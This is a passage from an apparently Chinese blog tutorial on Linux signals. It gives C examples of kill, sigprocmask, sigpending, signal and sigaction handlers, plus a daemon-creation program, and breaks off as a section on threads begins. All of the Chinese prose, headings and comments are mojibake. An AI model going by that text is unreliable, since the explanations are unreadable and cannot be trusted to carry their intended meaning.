class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"parent,pid = %d\n"</span>,getpid());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"child pid = %d,ppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    kill(getppid(),SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä¿¡å·é›†æ“ä½œå‡½æ•°"><a href="#ä¿¡å·é›†æ“ä½œå‡½æ•°" class="headerlink" title="ä¿¡å·é›†æ“ä½œå‡½æ•°"></a>ä¿¡å·é›†æ“ä½œå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span> è‡ªå®šä¹‰ä¿¡å·é›†</span><br><span class="line">sigemptyset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) æ¸…ç©ºä¿¡å·é›†</span><br><span class="line">sigfillset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) å…¨éƒ¨ç½®<span class="number">1</span></span><br><span class="line">sigaddset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) å°†ä¸€ä¸ªä¿¡å·æ·»åŠ åˆ°é›†åˆä¸­</span><br><span class="line">sigdelset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) å°†ä¸€ä¸ªä¿¡å·ä»é›†åˆä¸­ç§»é™¤</span><br><span class="line">sigismember(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) åˆ¤æ–­ä¸€ä¸ªä¿¡å·æ˜¯å¦åœ¨é›†åˆä¸­</span><br></pre></td></tr></table></figure><h5 id="è®¾ç½®ä¿¡å·å±è”½å­—å’Œè§£é™¤å±è”½"><a href="#è®¾ç½®ä¿¡å·å±è”½å­—å’Œè§£é™¤å±è”½" class="headerlink" title="è®¾ç½®ä¿¡å·å±è”½å­—å’Œè§£é™¤å±è”½"></a>è®¾ç½®ä¿¡å·å±è”½å­—å’Œè§£é™¤å±è”½</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how,<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">sigset_t</span> *oldset)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  how:SIG_BLOCK è®¾ç½®é˜»å¡</span><br><span class="line">      SIG_UNBLOCK å–æ¶ˆé˜»å¡</span><br><span class="line">      SIG_SETMASK ç”¨è‡ªå®šä¹‰<span class="built_in">set</span>æ›¿æ¢ask</span><br><span class="line">  <span class="built_in">set</span>:è‡ªå®šä¹‰<span class="built_in">set</span></span><br><span class="line">  oldset:æ—§æœ‰çš„mask</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹æœªå†³ä¿¡å·é›†"><a href="#æŸ¥çœ‹æœªå†³ä¿¡å·é›†" class="headerlink" title="æŸ¥çœ‹æœªå†³ä¿¡å·é›†"></a>æŸ¥çœ‹æœªå†³ä¿¡å·é›†</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigpending</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  set:ä¼ å‡ºçš„æœªå†³ä¿¡å·é›†</span><br></pre></td></tr></table></figure><h5 id="å±è”½SIGINTä¿¡å·"><a href="#å±è”½SIGINTä¿¡å·" class="headerlink" title="å±è”½SIGINTä¿¡å·"></a>å±è”½SIGINTä¿¡å·</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_set</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(sigismember(<span class="built_in">set</span>,i))</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span>,oldset,pedset;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">sigaddset(&amp;<span class="built_in">set</span>,SIGINT);</span><br><span class="line"></span><br><span class="line">ret = sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;oldset);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigprocmask error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = sigpending(&amp;pedset);</span><br><span class="line">print_set(&amp;pedset);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¿¡å·æ•æ‰"><a href="#ä¿¡å·æ•æ‰" class="headerlink" title="ä¿¡å·æ•æ‰"></a>ä¿¡å·æ•æ‰</h4><h5 id="signalå‡½æ•°"><a href="#signalå‡½æ•°" class="headerlink" title="signalå‡½æ•°"></a>signalå‡½æ•°</h5><p>æ³¨å†Œä¸€ä¸ªä¿¡å·æ•æ‰å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">sighandler_t</span> handler)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨signalå‡½æ•°æ•æ‰SIGINTä¿¡å·"><a href="#ä½¿ç”¨signalå‡½æ•°æ•æ‰SIGINTä¿¡å·" class="headerlink" title="ä½¿ç”¨signalå‡½æ•°æ•æ‰SIGINTä¿¡å·"></a>ä½¿ç”¨signalå‡½æ•°æ•æ‰SIGINTä¿¡å·</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">signal(SIGINT,sig_catch);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="sigactionå‡½æ•°"><a href="#sigactionå‡½æ•°" class="headerlink" title="sigactionå‡½æ•°"></a>sigactionå‡½æ•°</h5><p>ä¿®æ”¹ä¿¡å·å¤„ç†åŠ¨ä½œ(é€šå¸¸åœ¨Linuxç”¨å…¶æ¥æ³¨å†Œä¸€ä¸ªä¿¡å·çš„æ•æ‰å‡½æ•°)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaction</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">const</span> struct sigaction *act,struct sigaction *oldact)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">æˆåŠŸï¼š0</span><br><span class="line">å¤±è´¥ï¼š<span class="number">-1</span> è®¾ç½®errno</span><br><span class="line">  </span><br><span class="line">å‚æ•°</span><br><span class="line">  act: ä¼ å…¥å‚æ•°ï¼Œæ–°çš„å¤„ç†æ–¹å¼</span><br><span class="line">  oldact: ä¼ å‡ºå‚æ•°ï¼Œæ—§çš„å¤„ç†æ–¹å¼</span><br></pre></td></tr></table></figure><p>struct sigaction ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> &#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_handler)(<span class="keyword">int</span>); <span class="comment">//æŒ‡å®šä¿¡å·æ•æ‰åçš„å¤„ç†å‡½æ•°å</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_sigaction)(<span class="keyword">int</span>,<span class="keyword">siginfo_t</span>*,<span class="keyword">void</span>*);</span><br><span class="line">  <span class="keyword">sigset_t</span> samask; <span class="comment">//è°ƒç”¨ä¿¡å·å¤„ç†å‡½æ•°æ—¶ï¼Œæ‰€è¦å±è”½çš„ä¿¡å·é›†åˆ</span></span><br><span class="line">  <span class="keyword">int</span> sa_flags; <span class="comment">//é€šå¸¸è®¾ç½®ä¸º0 è¡¨ç¤ºé»˜è®¤å±æ€§</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_restorer)(<span class="keyword">void</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨sigactionå‡½æ•°æ•æ‰SIGINTä¿¡å·"><a href="#ä½¿ç”¨sigactionå‡½æ•°æ•æ‰SIGINTä¿¡å·" class="headerlink" title="ä½¿ç”¨sigactionå‡½æ•°æ•æ‰SIGINTä¿¡å·"></a>ä½¿ç”¨sigactionå‡½æ•°æ•æ‰SIGINTä¿¡å·</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>,<span class="title">oldact</span>;</span></span><br><span class="line">act.sa_handler = sig_catch; <span class="comment">//set callback function name</span></span><br><span class="line">sigemptyset(&amp;(act.sa_mask)); <span class="comment">//set mask when sig_catch working</span></span><br><span class="line">act.sa_flags = <span class="number">0</span>; <span class="comment">//usually use</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = sigaction(SIGINT,&amp;act,&amp;oldact); <span class="comment">//æ³¨å†Œä¿¡å·æ•æ‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigaction error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®ˆæŠ¤è¿›ç¨‹"><a href="#å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="å®ˆæŠ¤è¿›ç¨‹"></a>å®ˆæŠ¤è¿›ç¨‹</h4><p>Daemonæ˜¯Linuxä¸­çš„åå°æœåŠ¡è¿›ç¨‹ï¼Œé€šå¸¸ç‹¬ç«‹äºæ§åˆ¶ç»ˆç«¯å¹¶ä¸”å‘¨æœŸæ€§åœ°æ‰§è¡ŒæŸç§ä»»åŠ¡æˆ–ç­‰å¾…å¤„ç†æŸäº›å‘ç”Ÿçš„æ—¶é—´ï¼Œä¸€èˆ¬é‡‡ç”¨ä»¥dç»“å°¾çš„åå­—ã€‚Linuxåå°çš„ä¸€äº›ç³»ç»ŸæœåŠ¡è¿›ç¨‹ï¼Œæ²¡æœ‰æ§åˆ¶ç»ˆç«¯ï¼Œä¸èƒ½ç›´æ¥å’Œç”¨æˆ·äº¤äº’ï¼Œä¸å—ç”¨æˆ·ç™»é™†ã€æ³¨é”€çš„å½±å“ï¼Œä¸€ç›´åœ¨è¿è¡Œç€ï¼Œä»–ä»¬éƒ½æ˜¯å®ˆæŠ¤è¿›ç¨‹ã€‚å¦‚ï¼Œé¢„è¯»å…¥ç¼“è¾“å‡ºæœºåˆ¶çš„å®ç°ï¼ŒFTPæœåŠ¡å™¨ï¼ŒnfsæœåŠ¡å™¨ç­‰ã€‚åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ï¼Œæœ€å…³é”®çš„ä¸€æ­¥æ˜¯è°ƒç”¨setsidå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„Sessionï¼Œå¹¶æˆä¸ºSession Leader</p><h5 id="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹æ¨¡å‹"><a href="#åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹æ¨¡å‹" class="headerlink" title="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹æ¨¡å‹"></a>åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹æ¨¡å‹</h5><ul><li><p>åˆ›å»ºå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹æ¨å‡º</p><p>æ‰€æœ‰å·¥ä½œåœ¨å­è¿›ç¨‹ä¸­è¿›è¡Œå½¢å¼ä¸Šè„±ç¦»äº†æ§åˆ¶ç»ˆç«¯</p></li><li><p>åœ¨å­è¿›ç¨‹ä¸­åˆ›å»ºæ–°ä¼šè¯</p><p><code>setsid()</code>å‡½æ•°</p><p>ä½¿å­è¿›ç¨‹å®Œå…¨ç‹¬ç«‹å‡ºæ¥ï¼Œè„±ç¦»æ§åˆ¶</p></li><li><p>æ”¹å˜å½“å‰ç›®å½•ä¸ºæ ¹ç›®å½•</p><p><code>chdir()</code>å‡½æ•°</p><p>é˜²æ­¢å ç”¨å¯å¸è½½çš„æ–‡ä»¶ç³»ç»Ÿ(Uç›˜ç­‰)</p><p>ä¹Ÿå¯ä»¥æ¢æˆå…¶ä»–è·¯å¾„</p></li><li><p>é‡è®¾æ–‡ä»¶æƒé™æ©ç </p><p><code>umask()</code>å‡½æ•°</p><p>é˜²æ­¢ç»§æ‰¿çš„æ–‡ä»¶åˆ›å»ºå±è”½å­—æ‹’ç»æŸäº›æƒé™</p><p>å¢åŠ å®ˆæŠ¤è¿›ç¨‹çµæ´»æ€§</p></li><li><p>å…³é—­æ–‡ä»¶æè¿°ç¬¦(0,1,2)</p><p>ç»§æ‰¿çš„æ‰“å¼€æ–‡ä»¶ä¸ä¼šç”¨åˆ°ï¼Œæµªè´¹ç³»ç»Ÿèµ„æºï¼Œæ— æ³•å¸è½½</p></li></ul><h5 id="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ä»£ç "><a href="#åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ä»£ç " class="headerlink" title="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ä»£ç "></a>åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹ä»£ç </h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> ret,fd;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//çˆ¶è¿›ç¨‹ç»ˆæ­¢</span></span><br><span class="line"></span><br><span class="line">pid = setsid();  <span class="comment">//åˆ›å»ºæ–°ä¼šè¯</span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"setsid error"</span>);</span><br><span class="line">ret = chdir(<span class="string">"/Users/caoyifan/Desktop/test"</span>); <span class="comment">//æ”¹å˜å·¥ä½œç›®å½•ä½ç½®</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"chdir error"</span>);</span><br><span class="line">umask(<span class="number">0022</span>); <span class="comment">//æ”¹å˜æ–‡ä»¶è®¿é—®æƒé™æ©ç </span></span><br><span class="line">close(STDIN_FILENO); <span class="comment">//å…³é—­æ–‡ä»¶æè¿°ç¬¦0</span></span><br><span class="line">fd = open(<span class="string">"/dev/null"</span>,O_RDWR); <span class="comment">// fd=0</span></span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line">dup2(fd,STDOUT_FILENO); <span class="comment">//é‡å®šå‘stdoutå’Œstderr</span></span><br><span class="line">dup2(fd,STDERR_FILENO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">//æ¨¡æ‹Ÿå®ˆæŠ¤è¿›ç¨‹ä¸šåŠ¡</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h4><h5 id="çº¿ç¨‹æ¦‚å¿µ"><a href="#çº¿ç¨‹æ¦‚å¿µ" class="headerlink" title="çº¿ç¨‹æ¦‚å¿µ"></a>çº¿ç¨‹æ¦‚å¿µ</h5><p>LWPï¼šlight weight process 